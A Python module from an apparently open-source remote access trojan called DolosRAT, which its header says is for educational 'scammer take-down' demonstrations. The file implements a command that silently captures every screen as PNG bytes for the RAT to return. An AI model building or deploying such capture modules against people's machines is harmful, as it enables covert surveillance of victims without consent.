# !/usr/bin/env python
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Creator : Ryan I.
# Created Date: 20/07/2023
# version ='1.0'
# ---------------------------------------------------------------------------
"""
DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
techniques frequently used within scammer take-down operations. Please note that
the use of this tool is for educational purposes only.
"""

# Built-in/Generic Imports.
from builtins import getattr
from io import BytesIO

# Modules.
from .command import Command

class ScreenshotCommand(Command):
    """_summary_

    Args:
        Command (_type_): _description_
    """

    def __init__(self: object) -> None:
        """_summary_

        Args:
            self (object): _description_

        Returns:
            Any: _description_
        """

        # Initialise from Command parent.
        super().__init__()

        # Create list of imported dependencies.
        self.create_deps('PIL.ImageGrab')

    def execute(self: object) -> bytes:
        """_summary_

        Args:
            self (object): _description_

        Returns:
            Any: _description_
        """

        # Create bytearray to store bytes for
        # screen capture.
        img_bytes = BytesIO()

        # Create image capture, in PNG format.
        img_capture = getattr(self.get_dep('PIL.ImageGrab'),'grab')(all_screens=True)
        img_capture.save(img_bytes, 'PNG')

        # Return bytes in byte array.
        return img_bytes.getvalue()
